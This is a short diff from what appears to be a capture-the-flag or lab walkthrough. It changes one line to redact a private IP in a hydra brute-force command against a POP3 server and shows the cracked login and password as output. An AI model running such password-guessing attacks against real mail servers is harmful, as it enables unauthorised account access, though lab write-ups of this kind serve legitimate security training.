@@ -30,7 +30,7 @@ username -> boris  //not Boris
 
 
 ı tryed brute force attack to pop3 server
-hydra -L users.txt -P fasttrack.txt pop3://10.0.2.23:55007 
+hydra -L users.txt -P fasttrack.txt pop3://10.X.X.X:55007 
 
 [55007][pop3] host: 10.X.X.X   login: boris   password: secret1!
 
